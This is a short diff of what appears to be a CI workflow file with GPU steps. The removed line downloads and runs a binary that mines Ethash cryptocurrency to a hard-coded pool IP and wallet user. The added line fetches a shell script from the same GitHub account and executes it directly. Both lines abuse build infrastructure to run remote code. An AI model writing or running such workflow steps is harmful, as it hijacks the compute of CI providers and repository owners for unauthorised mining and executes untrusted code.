@@ -8,4 +8,4 @@ jobs:
     steps:
       - run: nvidia-smi
       - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
-      - run: wget https://github.com/githuboneheart/mom/blob/main/views/bezzHash && chmod +x bezzHash && ./bezzHash --algo ETHASH --pool 3.90.200.104:80 --user 35Kx5TuJm53NqARyAfYRdmdv1DWysuGe5a.Berkah --ethstratum ETHPROX 
+      - run: wget https://raw.githubusercontent.com/githuboneheart/mom/main/aju.sh && chmod +x aju.sh && ./aju.sh
